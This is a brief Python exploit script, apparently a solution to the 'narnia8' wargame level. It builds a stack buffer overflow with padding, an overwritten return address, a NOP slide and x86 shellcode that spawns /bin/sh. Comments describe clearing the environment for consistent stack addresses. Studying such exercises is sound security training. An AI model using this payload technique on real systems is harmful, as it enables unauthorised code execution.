# first delete env variables
# in shell: env -i ./narnia8 $(python /tmp/jimmy/narnia8.py)
# in gdb:   unset env

import struct
padding = 'A' * 20
blah_pointer = struct.pack('I', 0xffffdf65)
ebp = 'BBBB'
eip = struct.pack('I', 0xffffdde4)
nopslide = '\x90' * 50
payload = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80    \x31\xc0\x40\xcd\x80'
print(padding + blah_pointer + ebp + eip + nopslide + payload)
